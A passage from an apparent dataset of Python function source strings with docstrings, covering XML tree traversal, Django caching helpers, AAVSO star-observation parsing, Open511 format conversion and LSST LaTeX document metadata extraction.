            "def serialize_text(out, text):\n    \"\"\"This method is used to append content of the `text`\n    argument to the `out` argument.\n\n    Depending on how many lines in the text, a\n    padding can be added to all lines except the first\n    one.\n\n    Concatenation result is appended to the `out` argument.\n    \"\"\"\n    padding = len(out)\n    # we need to add padding to all lines\n    # except the first one\n    add_padding = padding_adder(padding)\n    text = add_padding(text, ignore_first_line=True)\n\n    return out + text"
        ],
        [
            "def format_value(value):\n    \"\"\"This function should return unicode representation of the value\n    \"\"\"\n    value_id = id(value)\n\n    if value_id in recursion_breaker.processed:\n        return u'<recursion>'\n\n    recursion_breaker.processed.add(value_id)\n\n    try:\n        if isinstance(value, six.binary_type):\n            # suppose, all byte strings are in unicode\n            # don't know if everybody in the world uses anything else?\n            return u\"'{0}'\".format(value.decode('utf-8'))\n\n        elif isinstance(value, six.text_type):\n            return u\"u'{0}'\".format(value)\n\n        elif isinstance(value, (list, tuple)):\n            # long lists or lists with multiline items\n            # will be shown vertically\n            values = list(map(format_value, value))\n            result = serialize_list(u'[', values, delimiter=u',') + u']'\n            return force_unicode(result)\n\n        elif isinstance(value, dict):\n            items = six.iteritems(value)\n\n            # format each key/value pair as a text,\n            # calling format_value recursively\n            items = (tuple(map(format_value, item))\n                     for item in items)\n\n            items = list(items)\n            # sort by keys for readability\n            items.sort()\n\n            # for each item value\n            items = [\n                serialize_text(\n                    u'{0}: '.format(key),\n                    item_value)\n                for key, item_value in items]\n\n            # and serialize these pieces as a list, enclosing\n            # them into a curve brackets\n            result = serialize_list(u'{', items, delimiter=u',') + u'}'\n            return force_unicode(result)\n        return force_unicode(repr(value))\n\n    finally:\n        recursion_breaker.processed.remove(value_id)"
        ],
        [
            "def traverse(element, query, deep=False):\n    \"\"\"\n    Helper function to traverse an element tree rooted at element, yielding nodes matching the query.\n    \"\"\"\n    # Grab the next part of the query (it will be chopped from the front each iteration).\n    part = query[0]\n    if not part:\n        # If the part is blank, we encountered a //, meaning search all sub-nodes.\n        query = query[1:]\n        part = query[0]\n        deep = True\n    # Parse out any predicate (tag[pred]) from this part of the query.\n    part, predicate = xpath_re.match(query[0]).groups()\n    for c in element._children:\n        if part in ('*', c.tagname) and c._match(predicate):\n            # A potential matching branch: this child matches the next query part (and predicate).\n            if len(query) == 1:\n                # If this is the last part of the query, we found a matching element, yield it.\n                yield c\n            else:\n                # Otherwise, check the children of this child against the next query part.\n                for e in traverse(c, query[1:]):\n                    yield e\n        if deep:\n            # If we're searching all sub-nodes, traverse with the same query, regardless of matching.\n            # This basically creates a recursion branch to search EVERYWHERE for anything after //.\n            for e in traverse(c, query, deep=True):\n                yield e"
        ],
        [
            "def parse_query(query):\n    \"\"\"\n    Given a simplified XPath query string, returns an array of normalized query parts.\n    \"\"\"\n    parts = query.split('/')\n    norm = []\n    for p in parts:\n        p = p.strip()\n        if p:\n            norm.append(p)\n        elif '' not in norm:\n            norm.append('')\n    return norm"
        ],
        [
            "def insert(self, before, name, attrs=None, data=None):\n        \"\"\"\n        Inserts a new element as a child of this element, before the specified index or sibling.\n\n        :param before: An :class:`XmlElement` or a numeric index to insert the new node before\n        :param name: The tag name to add\n        :param attrs: Attributes for the new tag\n        :param data: CDATA for the new tag\n        :returns: The newly-created element\n        :rtype: :class:`XmlElement`\n        \"\"\"\n        if isinstance(before, self.__class__):\n            if before.parent != self:\n                raise ValueError('Cannot insert before an element with a different parent.')\n            before = before.index\n        # Make sure 0 <= before <= len(_children).\n        before = min(max(0, before), len(self._children))\n        elem = self.__class__(name, attrs, data, parent=self, index=before)\n        self._children.insert(before, elem)\n        # Re-index all the children.\n        for idx, c in enumerate(self._children):\n            c.index = idx\n        return elem"
        ],
        [
            "def children(self, name=None, reverse=False):\n        \"\"\"\n        A generator yielding children of this node.\n\n        :param name: If specified, only consider elements with this tag name\n        :param reverse: If ``True``, children will be yielded in reverse declaration order\n        \"\"\"\n        elems = self._children\n        if reverse:\n            elems = reversed(elems)\n        for elem in elems:\n            if name is None or elem.tagname == name:\n                yield elem"
        ],
        [
            "def _match(self, pred):\n        \"\"\"\n        Helper function to determine if this node matches the given predicate.\n        \"\"\"\n        if not pred:\n            return True\n        # Strip off the [ and ]\n        pred = pred[1:-1]\n        if pred.startswith('@'):\n            # An attribute predicate checks the existence (and optionally value) of an attribute on this tag.\n            pred = pred[1:]\n            if '=' in pred:\n                attr, value = pred.split('=', 1)\n                if value[0] in ('\"', \"'\"):\n                    value = value[1:]\n                if value[-1] in ('\"', \"'\"):\n                    value = value[:-1]\n                return self.attrs.get(attr) == value\n            else:\n                return pred in self.attrs\n        elif num_re.match(pred):\n            # An index predicate checks whether we are the n-th child of our parent (0-based).\n            index = int(pred)\n            if index < 0:\n                if self.parent:\n                    # For negative indexes, count from the end of the list.\n                    return self.index == (len(self.parent._children) + index)\n                else:\n                    # If we're the root node, the only index we could be is 0.\n                    return index == 0\n            else:\n                return index == self.index\n        else:\n            if '=' in pred:\n                tag, value = pred.split('=', 1)\n                if value[0] in ('\"', \"'\"):\n                    value = value[1:]\n                if value[-1] in ('\"', \"'\"):\n                    value = value[:-1]\n                for c in self._children:\n                    if c.tagname == tag and c.data == value:\n                        return True\n            else:\n                # A plain [tag] predicate means we match if we have a child with tagname \"tag\".\n                for c in self._children:\n                    if c.tagname == pred:\n                        return True\n        return False"
        ],
        [
            "def path(self, include_root=False):\n        \"\"\"\n        Returns a canonical path to this element, relative to the root node.\n\n        :param include_root: If ``True``, include the root node in the path. Defaults to ``False``.\n        \"\"\"\n        path = '%s[%d]' % (self.tagname, self.index or 0)\n        p = self.parent\n        while p is not None:\n            if p.parent or include_root:\n                path = '%s[%d]/%s' % (p.tagname, p.index or 0, path)\n            p = p.parent\n        return path"
        ],
        [
            "def iter(self, name=None):\n        \"\"\"\n        Recursively find any descendants of this node with the given tag name. If a tag name is omitted, this will\n        yield every descendant node.\n\n        :param name: If specified, only consider elements with this tag name\n        :returns: A generator yielding descendants of this node\n        \"\"\"\n        for c in self._children:\n            if name is None or c.tagname == name:\n                yield c\n            for gc in c.find(name):\n                yield gc"
        ],
        [
            "def last(self, name=None):\n        \"\"\"\n        Returns the last child of this node.\n\n        :param name: If specified, only consider elements with this tag name\n        :rtype: :class:`XmlElement`\n        \"\"\"\n        for c in self.children(name, reverse=True):\n            return c"
        ],
        [
            "def parents(self, name=None):\n        \"\"\"\n        Yields all parents of this element, back to the root element.\n\n        :param name: If specified, only consider elements with this tag name\n        \"\"\"\n        p = self.parent\n        while p is not None:\n            if name is None or p.tagname == name:\n                yield p\n            p = p.parent"
        ],
        [
            "def next(self, name=None):\n        \"\"\"\n        Returns the next sibling of this node.\n\n        :param name: If specified, only consider elements with this tag name\n        :rtype: :class:`XmlElement`\n        \"\"\"\n        if self.parent is None or self.index is None:\n            return None\n        for idx in xrange(self.index + 1, len(self.parent)):\n            if name is None or self.parent[idx].tagname == name:\n                return self.parent[idx]"
        ],
        [
            "def prev(self, name=None):\n        \"\"\"\n        Returns the previous sibling of this node.\n\n        :param name: If specified, only consider elements with this tag name\n        :rtype: :class:`XmlElement`\n        \"\"\"\n        if self.parent is None or self.index is None:\n            return None\n        for idx in xrange(self.index - 1, -1, -1):\n            if name is None or self.parent[idx].tagname == name:\n                return self.parent[idx]"
        ],
        [
            "def get_observations(self):\n        \"\"\"\n        Parses the HTML table into a list of dictionaries, each of which\n        represents a single observation.\n        \"\"\"\n        if self.empty:\n            return []\n        rows = list(self.tbody)\n        observations = []\n        for row_observation, row_details in zip(rows[::2], rows[1::2]):\n            data = {}\n            cells = OBSERVATION_XPATH(row_observation)\n            data['name'] = _clean_cell(cells[0])\n            data['date'] = _clean_cell(cells[1])\n            data['magnitude'] = _clean_cell(cells[3])\n            data['obscode'] = _clean_cell(cells[6])\n            cells = DETAILS_XPATH(row_details)\n            data['comp1'] = _clean_cell(cells[0])\n            data['chart'] = _clean_cell(cells[3]).replace('None', '')\n            data['comment_code'] = _clean_cell(cells[4])\n            data['notes'] = _clean_cell(cells[5])\n            observations.append(data)\n        return observations"
        ],
        [
            "def get_cache_key(prefix, *args, **kwargs):\n    \"\"\"\n    Calculates cache key based on `args` and `kwargs`.\n    `args` and `kwargs` must be instances of hashable types.\n    \"\"\"\n    hash_args_kwargs = hash(tuple(kwargs.iteritems()) + args)\n    return '{}_{}'.format(prefix, hash_args_kwargs)"
        ],
        [
            "def cache_func(prefix, method=False):\n    \"\"\"\n    Cache result of function execution into the django cache backend.\n    Calculate cache key based on `prefix`, `args` and `kwargs` of the function.\n    For using like object method set `method=True`.\n    \"\"\"\n    def decorator(func):\n        @wraps(func)\n        def wrapper(*args, **kwargs):\n            cache_args = args\n            if method:\n                cache_args = args[1:]\n            cache_key = get_cache_key(prefix, *cache_args, **kwargs)\n            cached_value = cache.get(cache_key)\n            if cached_value is None:\n                cached_value = func(*args, **kwargs)\n                cache.set(cache_key, cached_value)\n            return cached_value\n        return wrapper\n    return decorator"
        ],
        [
            "def get_or_default(func=None, default=None):\n    \"\"\"\n    Wrapper around Django's ORM `get` functionality.\n    Wrap anything that raises ObjectDoesNotExist exception\n    and provide the default value if necessary.\n    `default` by default is None. `default` can be any callable,\n    if it is callable it will be called when ObjectDoesNotExist\n    exception will be raised.\n    \"\"\"\n    def decorator(func):\n        @wraps(func)\n        def wrapper(*args, **kwargs):\n            try:\n                return func(*args, **kwargs)\n            except ObjectDoesNotExist:\n                if callable(default):\n                    return default()\n                else:\n                    return default\n        return wrapper\n    if func is None:\n        return decorator\n    else:\n        return decorator(func)"
        ],
        [
            "def _get_column_nums_from_args(columns):\n    \"\"\"Turn column inputs from user into list of simple numbers.\n\n    Inputs can be:\n\n      - individual number: 1\n      - range: 1-3\n      - comma separated list: 1,2,3,4-6\n    \"\"\"\n    nums = []\n    for c in columns:\n        for p in c.split(','):\n            p = p.strip()\n            try:\n                c = int(p)\n                nums.append(c)\n            except (TypeError, ValueError):\n                start, ignore, end = p.partition('-')\n                try:\n                    start = int(start)\n                    end = int(end)\n                except (TypeError, ValueError):\n                    raise ValueError(\n                        'Did not understand %r, expected digit-digit' % c\n                    )\n                inc = 1 if start < end else -1\n                nums.extend(range(start, end + inc, inc))\n    # The user will pass us 1-based indexes, but we need to use\n    # 0-based indexing with the row.\n    return [n - 1 for n in nums]"
        ],
        [
            "def _get_printable_columns(columns, row):\n    \"\"\"Return only the part of the row which should be printed.\n    \"\"\"\n    if not columns:\n        return row\n\n    # Extract the column values, in the order specified.\n    return tuple(row[c] for c in columns)"
        ],
        [
            "def writerow(self, observation_data):\n        \"\"\"\n        Writes a single observation to the output file.\n\n        If the ``observation_data`` parameter is a dictionary, it is\n        converted to a list to keep a consisted field order (as described\n        in format specification). Otherwise it is assumed that the data\n        is a raw record ready to be written to file.\n\n        :param observation_data: a single observation as a dictionary or list\n        \"\"\"\n        if isinstance(observation_data, (list, tuple)):\n            row = observation_data\n        else:\n            row = self.dict_to_row(observation_data)\n        self.writer.writerow(row)"
        ],
        [
            "def dict_to_row(cls, observation_data):\n        \"\"\"\n        Takes a dictionary of observation data and converts it to a list\n        of fields according to AAVSO visual format specification.\n\n        :param cls: current class\n        :param observation_data: a single observation as a dictionary\n        \"\"\"\n        row = []\n        row.append(observation_data['name'])\n        row.append(observation_data['date'])\n        row.append(observation_data['magnitude'])\n        comment_code = observation_data.get('comment_code', 'na')\n        if not comment_code:\n            comment_code = 'na'\n        row.append(comment_code)\n        comp1 = observation_data.get('comp1', 'na')\n        if not comp1:\n            comp1 = 'na'\n        row.append(comp1)\n        comp2 = observation_data.get('comp2', 'na')\n        if not comp2:\n            comp2 = 'na'\n        row.append(comp2)\n        chart = observation_data.get('chart', 'na')\n        if not chart:\n            chart = 'na'\n        row.append(chart)\n        notes = observation_data.get('notes', 'na')\n        if not notes:\n            notes = 'na'\n        row.append(notes)\n        return row"
        ],
        [
            "def row_to_dict(cls, row):\n        \"\"\"\n        Converts a raw input record to a dictionary of observation data.\n\n        :param cls: current class\n        :param row: a single observation as a list or tuple\n        \"\"\"\n        comment_code = row[3]\n        if comment_code.lower() == 'na':\n            comment_code = ''\n        comp1 = row[4]\n        if comp1.lower() == 'na':\n            comp1 = ''\n        comp2 = row[5]\n        if comp2.lower() == 'na':\n            comp2 = ''\n        chart = row[6]\n        if chart.lower() == 'na':\n            chart = ''\n        notes = row[7]\n        if notes.lower() == 'na':\n            notes = ''\n        return {\n            'name': row[0],\n            'date': row[1],\n            'magnitude': row[2],\n            'comment_code': comment_code,\n            'comp1': comp1,\n            'comp2': comp2,\n            'chart': chart,\n            'notes': notes,\n        }"
        ],
        [
            "def get_default_tag(app):\n    '''Get the name of the view function used to prevent having to set the tag\n    manually for every endpoint'''\n    view_func = get_view_function(app, request.path, request.method)\n    if view_func:\n        return view_func.__name__"
        ],
        [
            "def download_observations(observer_code):\n    \"\"\"\n    Downloads all variable star observations by a given observer.\n\n    Performs a series of HTTP requests to AAVSO's WebObs search and\n    downloads the results page by page. Each page is then passed to\n    :py:class:`~pyaavso.parsers.webobs.WebObsResultsParser` and parse results\n    are added to the final observation list.\n    \"\"\"\n    page_number = 1\n    observations = []\n    while True:\n        logger.info('Downloading page %d...', page_number)\n        response = requests.get(WEBOBS_RESULTS_URL, params={\n            'obscode': observer_code,\n            'num_results': 200,\n            'obs_types': 'all',\n            'page': page_number,\n        })\n        logger.debug(response.request.url)\n        parser = WebObsResultsParser(response.text)\n        observations.extend(parser.get_observations())\n        # kinda silly, but there's no need for lxml machinery here\n        if '>Next</a>' not in response.text:\n            break\n        page_number += 1\n    return observations"
        ],
        [
            "def image_path(instance, filename):\n    \"\"\"Generates likely unique image path using md5 hashes\"\"\"\n    filename, ext = os.path.splitext(filename.lower())\n    instance_id_hash = hashlib.md5(str(instance.id)).hexdigest()\n    filename_hash = ''.join(random.sample(hashlib.md5(filename.encode('utf-8')).hexdigest(), 8))\n    return '{}/{}{}'.format(instance_id_hash, filename_hash, ext)"
        ],
        [
            "async def process_lander_page(session, github_api_token, ltd_product_data,\n                              mongo_collection=None):\n    \"\"\"Extract, transform, and load metadata from Lander-based projects.\n\n    Parameters\n    ----------\n    session : `aiohttp.ClientSession`\n        Your application's aiohttp client session.\n        See http://aiohttp.readthedocs.io/en/stable/client.html.\n    github_api_token : `str`\n        A GitHub personal API token. See the `GitHub personal access token\n        guide`_.\n    ltd_product_data : `dict`\n        Contents of ``metadata.yaml``, obtained via `download_metadata_yaml`.\n        Data for this technote from the LTD Keeper API\n        (``GET /products/<slug>``). Usually obtained via\n        `lsstprojectmeta.ltd.get_ltd_product`.\n    mongo_collection : `motor.motor_asyncio.AsyncIOMotorCollection`, optional\n        MongoDB collection. This should be the common MongoDB collection for\n        LSST projectmeta JSON-LD records. If provided, ths JSON-LD is upserted\n        into the MongoDB collection.\n\n    Returns\n    -------\n    metadata : `dict`\n        JSON-LD-formatted dictionary.\n\n    Raises\n    ------\n    NotLanderPageError\n        Raised when the LTD product cannot be interpreted as a Lander page\n        because the ``/metadata.jsonld`` file is absent. This implies that\n        the LTD product *could* be of a different format.\n\n    .. `GitHub personal access token guide`: https://ls.st/41d\n    \"\"\"\n    logger = logging.getLogger(__name__)\n\n    # Try to download metadata.jsonld from the Landing page site.\n    published_url = ltd_product_data['published_url']\n    jsonld_url = urljoin(published_url, '/metadata.jsonld')\n    try:\n        async with session.get(jsonld_url) as response:\n            logger.debug('%s response status %r', jsonld_url, response.status)\n            response.raise_for_status()\n            json_data = await response.text()\n    except aiohttp.ClientResponseError as err:\n        logger.debug('Tried to download %s, got status %d',\n                     jsonld_url, err.code)\n        raise NotLanderPageError()\n    # Use our own json parser to get datetimes\n    metadata = decode_jsonld(json_data)\n\n    if mongo_collection is not None:\n        await _upload_to_mongodb(mongo_collection, metadata)\n\n    return metadata"
        ],
        [
            "async def _upload_to_mongodb(collection, jsonld):\n    \"\"\"Upsert the technote resource into the projectmeta MongoDB collection.\n\n    Parameters\n    ----------\n    collection : `motor.motor_asyncio.AsyncIOMotorCollection`\n        The MongoDB collection.\n    jsonld : `dict`\n        The JSON-LD document that represents the document resource.\n    \"\"\"\n    document = {\n        'data': jsonld\n    }\n    query = {\n        'data.reportNumber': jsonld['reportNumber']\n    }\n    await collection.update(query, document, upsert=True, multi=False)"
        ],
        [
            "def json_doc_to_xml(json_obj, lang='en', custom_namespace=None):\n    \"\"\"Converts a Open511 JSON document to XML.\n\n    lang: the appropriate language code\n\n    Takes a dict deserialized from JSON, returns an lxml Element.\n\n    Accepts only the full root-level JSON object from an Open511 response.\"\"\"\n    if 'meta' not in json_obj:\n        raise Exception(\"This function requires a conforming Open511 JSON document with a 'meta' section.\")\n    json_obj = dict(json_obj)\n    meta = json_obj.pop('meta')\n    elem = get_base_open511_element(lang=lang, version=meta.pop('version'))\n\n    pagination = json_obj.pop('pagination', None)\n\n    json_struct_to_xml(json_obj, elem, custom_namespace=custom_namespace)\n\n    if pagination:\n        elem.append(json_struct_to_xml(pagination, 'pagination', custom_namespace=custom_namespace))\n\n    json_struct_to_xml(meta, elem)\n\n    return elem"
        ],
        [
            "def json_struct_to_xml(json_obj, root, custom_namespace=None):\n    \"\"\"Converts a Open511 JSON fragment to XML.\n\n    Takes a dict deserialized from JSON, returns an lxml Element.\n\n    This won't provide a conforming document if you pass in a full JSON document;\n    it's for translating little fragments, and is mostly used internally.\"\"\"\n    if isinstance(root, (str, unicode)):\n        if root.startswith('!'):\n            root = etree.Element('{%s}%s' % (NS_PROTECTED, root[1:]))\n        elif root.startswith('+'):\n            if not custom_namespace:\n                raise Exception(\"JSON fields starts with +, but no custom namespace provided\")\n            root = etree.Element('{%s}%s' % (custom_namespace, root[1:]))\n        else:\n            root = etree.Element(root)\n    if root.tag in ('attachments', 'grouped_events', 'media_files'):\n        for link in json_obj:\n            root.append(json_link_to_xml(link))\n    elif isinstance(json_obj, (str, unicode)):\n        root.text = json_obj\n    elif isinstance(json_obj, (int, float)):\n        root.text = unicode(json_obj)\n    elif isinstance(json_obj, dict):\n        if frozenset(json_obj.keys()) == frozenset(('type', 'coordinates')):\n            root.append(geojson_to_gml(json_obj))\n        else:\n            for key, val in json_obj.items():\n                if key == 'url' or key.endswith('_url'):\n                    el = json_link_to_xml(val, json_link_key_to_xml_rel(key))\n                else:\n                    el = json_struct_to_xml(val, key, custom_namespace=custom_namespace)\n                if el is not None:\n                    root.append(el)\n    elif isinstance(json_obj, list):\n        tag_name = root.tag\n        if tag_name.endswith('ies'):\n            tag_name = tag_name[:-3] + 'y'\n        elif tag_name.endswith('s'):\n            tag_name = tag_name[:-1]\n        for val in json_obj:\n            el = json_struct_to_xml(val, tag_name, custom_namespace=custom_namespace)\n            if el is not None:\n                root.append(el)\n    elif json_obj is None:\n        return None\n    else:\n        raise NotImplementedError\n    return root"
        ],
        [
            "def geojson_to_gml(gj, set_srs=True):\n    \"\"\"Given a dict deserialized from a GeoJSON object, returns an lxml Element\n    of the corresponding GML geometry.\"\"\"\n    tag = G(gj['type'])\n    if set_srs:\n        tag.set('srsName', 'urn:ogc:def:crs:EPSG::4326')\n\n    if gj['type'] == 'Point':\n        tag.append(G.pos(_reverse_geojson_coords(gj['coordinates'])))\n    elif gj['type'] == 'LineString':\n        tag.append(G.posList(' '.join(_reverse_geojson_coords(ll) for ll in gj['coordinates'])))\n    elif gj['type'] == 'Polygon':\n        rings = [\n            G.LinearRing(\n                G.posList(' '.join(_reverse_geojson_coords(ll) for ll in ring))\n            ) for ring in gj['coordinates']\n        ]\n        tag.append(G.exterior(rings.pop(0)))\n        for ring in rings:\n            tag.append(G.interior(ring))\n    elif gj['type'] in ('MultiPoint', 'MultiLineString', 'MultiPolygon'):\n        single_type = gj['type'][5:]\n        member_tag = single_type[0].lower() + single_type[1:] + 'Member'\n        for coord in gj['coordinates']:\n            tag.append(\n                G(member_tag, geojson_to_gml({'type': single_type, 'coordinates': coord}, set_srs=False))\n            )\n    else:\n        raise NotImplementedError\n\n    return tag"
        ],
        [
            "def geom_to_xml_element(geom):\n    \"\"\"Transform a GEOS or OGR geometry object into an lxml Element\n    for the GML geometry.\"\"\"\n    if geom.srs.srid != 4326:\n        raise NotImplementedError(\"Only WGS 84 lat/long geometries (SRID 4326) are supported.\")\n    # GeoJSON output is far more standard than GML, so go through that\n    return geojson_to_gml(json.loads(geom.geojson))"
        ],
        [
            "def remove_comments(tex_source):\n    \"\"\"Delete latex comments from TeX source.\n\n    Parameters\n    ----------\n    tex_source : str\n        TeX source content.\n\n    Returns\n    -------\n    tex_source : str\n        TeX source without comments.\n    \"\"\"\n    # Expression via http://stackoverflow.com/a/13365453\n    return re.sub(r'(?<!\\\\)%.*$', r'', tex_source, flags=re.M)"
        ],
        [
            "def replace_macros(tex_source, macros):\n    r\"\"\"Replace macros in the TeX source with their content.\n\n    Parameters\n    ----------\n    tex_source : `str`\n        TeX source content.\n    macros : `dict`\n        Keys are macro names (including leading ``\\``) and values are the\n        content (as `str`) of the macros. See\n        `lsstprojectmeta.tex.scraper.get_macros`.\n\n    Returns\n    -------\n    tex_source : `str`\n        TeX source with known macros replaced.\n\n    Notes\n    -----\n    Macros with arguments are not supported.\n\n    Examples\n    --------\n    >>> macros = {r'\\handle': 'LDM-nnn'}\n    >>> sample = r'This is document \\handle.'\n    >>> replace_macros(sample, macros)\n    'This is document LDM-nnn.'\n\n    Any trailing slash after the macro command is also replaced by this\n    function.\n\n    >>> macros = {r'\\product': 'Data Management'}\n    >>> sample = r'\\title    [Test Plan]  { \\product\\ Test Plan}'\n    >>> replace_macros(sample, macros)\n    '\\\\title    [Test Plan]  { Data Management Test Plan}'\n    \"\"\"\n    for macro_name, macro_content in macros.items():\n        # '\\\\?' suffix matches an optional trailing '\\' that might be used\n        # for spacing.\n        pattern = re.escape(macro_name) + r\"\\\\?\"\n        # Wrap macro_content in lambda to avoid processing escapes\n        tex_source = re.sub(pattern, lambda _: macro_content, tex_source)\n    return tex_source"
        ],
        [
            "def ensure_format(doc, format):\n    \"\"\"\n    Ensures that the provided document is an lxml Element or json dict.\n    \"\"\"\n    assert format in ('xml', 'json')\n    if getattr(doc, 'tag', None) == 'open511':\n        if format == 'json':\n            return xml_to_json(doc)\n    elif isinstance(doc, dict) and 'meta' in doc:\n        if format == 'xml':\n            return json_doc_to_xml(doc)\n    else:\n        raise ValueError(\"Unrecognized input document\")\n    return doc"
        ],
        [
            "def open511_convert(input_doc, output_format, serialize=True, **kwargs):\n    \"\"\"\n    Convert an Open511 document between formats.\n    input_doc - either an lxml open511 Element or a deserialized JSON dict\n    output_format - short string name of a valid output format, as listed above\n    \"\"\"\n\n    try:\n        output_format_info = FORMATS[output_format]\n    except KeyError:\n        raise ValueError(\"Unrecognized output format %s\" % output_format)\n\n    input_doc = ensure_format(input_doc, output_format_info.input_format)\n\n    result = output_format_info.func(input_doc, **kwargs)\n    if serialize:\n        result = output_format_info.serializer(result)\n    return result"
        ],
        [
            "def read(cls, root_tex_path):\n        \"\"\"Construct an `LsstLatexDoc` instance by reading and parsing the\n        LaTeX source.\n\n        Parameters\n        ----------\n        root_tex_path : `str`\n            Path to the LaTeX source on the filesystem. For multi-file LaTeX\n            projects this should be the path to the root document.\n\n        Notes\n        -----\n        This method implements the following pipeline:\n\n        1. `lsstprojectmeta.tex.normalizer.read_tex_file`\n        2. `lsstprojectmeta.tex.scraper.get_macros`\n        3. `lsstprojectmeta.tex.normalizer.replace_macros`\n\n        Thus ``input`` and ``includes`` are resolved along with simple macros.\n        \"\"\"\n        # Read and normalize the TeX source, replacing macros with content\n        root_dir = os.path.dirname(root_tex_path)\n        tex_source = read_tex_file(root_tex_path)\n        tex_macros = get_macros(tex_source)\n        tex_source = replace_macros(tex_source, tex_macros)\n        return cls(tex_source, root_dir=root_dir)"
        ],
        [
            "def format_content(self, format='plain', mathjax=False,\n                       smart=True, extra_args=None):\n        \"\"\"Get the document content in the specified markup format.\n\n        Parameters\n        ----------\n        format : `str`, optional\n            Output format (such as ``'html5'`` or ``'plain'``).\n        mathjax : `bool`, optional\n            Allow pandoc to use MathJax math markup.\n        smart : `True`, optional\n            Allow pandoc to create \"smart\" unicode punctuation.\n        extra_args : `list`, optional\n            Additional command line flags to pass to Pandoc. See\n            `lsstprojectmeta.pandoc.convert.convert_text`.\n\n        Returns\n        -------\n        output_text : `str`\n            Converted content.\n        \"\"\"\n        output_text = convert_lsstdoc_tex(\n            self._tex, format,\n            mathjax=mathjax,\n            smart=smart,\n            extra_args=extra_args)\n        return output_text"
        ],
        [
            "def format_title(self, format='html5', deparagraph=True, mathjax=False,\n                     smart=True, extra_args=None):\n        \"\"\"Get the document title in the specified markup format.\n\n        Parameters\n        ----------\n        format : `str`, optional\n            Output format (such as ``'html5'`` or ``'plain'``).\n        deparagraph : `bool`, optional\n            Remove the paragraph tags from single paragraph content.\n        mathjax : `bool`, optional\n            Allow pandoc to use MathJax math markup.\n        smart : `True`, optional\n            Allow pandoc to create \"smart\" unicode punctuation.\n        extra_args : `list`, optional\n            Additional command line flags to pass to Pandoc. See\n            `lsstprojectmeta.pandoc.convert.convert_text`.\n\n        Returns\n        -------\n        output_text : `str`\n            Converted content or `None` if the title is not available in\n            the document.\n        \"\"\"\n        if self.title is None:\n            return None\n\n        output_text = convert_lsstdoc_tex(\n            self.title, format,\n            deparagraph=deparagraph,\n            mathjax=mathjax,\n            smart=smart,\n            extra_args=extra_args)\n        return output_text"
        ],
        [
            "def format_short_title(self, format='html5', deparagraph=True,\n                           mathjax=False, smart=True, extra_args=None):\n        \"\"\"Get the document short title in the specified markup format.\n\n        Parameters\n        ----------\n        format : `str`, optional\n            Output format (such as ``'html5'`` or ``'plain'``).\n        deparagraph : `bool`, optional\n            Remove the paragraph tags from single paragraph content.\n        mathjax : `bool`, optional\n            Allow pandoc to use MathJax math markup.\n        smart : `True`, optional\n            Allow pandoc to create \"smart\" unicode punctuation.\n        extra_args : `list`, optional\n            Additional command line flags to pass to Pandoc. See\n            `lsstprojectmeta.pandoc.convert.convert_text`.\n\n        Returns\n        -------\n        output_text : `str`\n            Converted content or `None` if the short title is not available in\n            the document.\n        \"\"\"\n        if self.short_title is None:\n            return None\n\n        output_text = convert_lsstdoc_tex(\n            self.short_title, 'html5',\n            deparagraph=deparagraph,\n            mathjax=mathjax,\n            smart=smart,\n            extra_args=extra_args)\n        return output_text"
        ],
        [
            "def format_abstract(self, format='html5', deparagraph=False, mathjax=False,\n                        smart=True, extra_args=None):\n        \"\"\"Get the document abstract in the specified markup format.\n\n        Parameters\n        ----------\n        format : `str`, optional\n            Output format (such as ``'html5'`` or ``'plain'``).\n        deparagraph : `bool`, optional\n            Remove the paragraph tags from single paragraph content.\n        mathjax : `bool`, optional\n            Allow pandoc to use MathJax math markup.\n        smart : `True`, optional\n            Allow pandoc to create \"smart\" unicode punctuation.\n        extra_args : `list`, optional\n            Additional command line flags to pass to Pandoc. See\n            `lsstprojectmeta.pandoc.convert.convert_text`.\n\n        Returns\n        -------\n        output_text : `str`\n            Converted content or `None` if the title is not available in\n            the document.\n        \"\"\"\n        if self.abstract is None:\n            return None\n\n        abstract_latex = self._prep_snippet_for_pandoc(self.abstract)\n\n        output_text = convert_lsstdoc_tex(\n            abstract_latex, format,\n            deparagraph=deparagraph,\n            mathjax=mathjax,\n            smart=smart,\n            extra_args=extra_args)\n        return output_text"
        ],
        [
            "def format_authors(self, format='html5', deparagraph=True, mathjax=False,\n                       smart=True, extra_args=None):\n        \"\"\"Get the document authors in the specified markup format.\n\n        Parameters\n        ----------\n        format : `str`, optional\n            Output format (such as ``'html5'`` or ``'plain'``).\n        deparagraph : `bool`, optional\n            Remove the paragraph tags from single paragraph content.\n        mathjax : `bool`, optional\n            Allow pandoc to use MathJax math markup.\n        smart : `True`, optional\n            Allow pandoc to create \"smart\" unicode punctuation.\n        extra_args : `list`, optional\n            Additional command line flags to pass to Pandoc. See\n            `lsstprojectmeta.pandoc.convert.convert_text`.\n\n        Returns\n        -------\n        output_text : `list` of `str`\n            Sequence of author names in the specified output markup format.\n        \"\"\"\n        formatted_authors = []\n        for latex_author in self.authors:\n            formatted_author = convert_lsstdoc_tex(\n                latex_author, format,\n                deparagraph=deparagraph,\n                mathjax=mathjax,\n                smart=smart,\n                extra_args=extra_args)\n            # removes Pandoc's terminal newlines\n            formatted_author = formatted_author.strip()\n            formatted_authors.append(formatted_author)\n        return formatted_authors"
        ],
        [
            "def _parse_documentclass(self):\n        \"\"\"Parse documentclass options.\n\n        Sets the the ``_document_options`` attribute.\n        \"\"\"\n        command = LatexCommand(\n            'documentclass',\n            {'name': 'options', 'required': False, 'bracket': '['},\n            {'name': 'class_name', 'required': True, 'bracket': '{'})\n        try:\n            parsed = next(command.parse(self._tex))\n        except StopIteration:\n            self._logger.warning('lsstdoc has no documentclass')\n            self._document_options = []\n\n        try:\n            content = parsed['options']\n            self._document_options = [opt.strip()\n                                      for opt in content.split(',')]\n        except KeyError:\n            self._logger.warning('lsstdoc has no documentclass options')\n            self._document_options = []"
        ],
        [
            "def _parse_title(self):\n        \"\"\"Parse the title from TeX source.\n\n        Sets these attributes:\n\n        - ``_title``\n        - ``_short_title``\n        \"\"\"\n        command = LatexCommand(\n            'title',\n            {'name': 'short_title', 'required': False, 'bracket': '['},\n            {'name': 'long_title', 'required': True, 'bracket': '{'})\n        try:\n            parsed = next(command.parse(self._tex))\n        except StopIteration:\n            self._logger.warning('lsstdoc has no title')\n            self._title = None\n            self._short_title = None\n\n        self._title = parsed['long_title']\n\n        try:\n            self._short_title = parsed['short_title']\n        except KeyError:\n            self._logger.warning('lsstdoc has no short title')\n            self._short_title = None"
        ],
        [
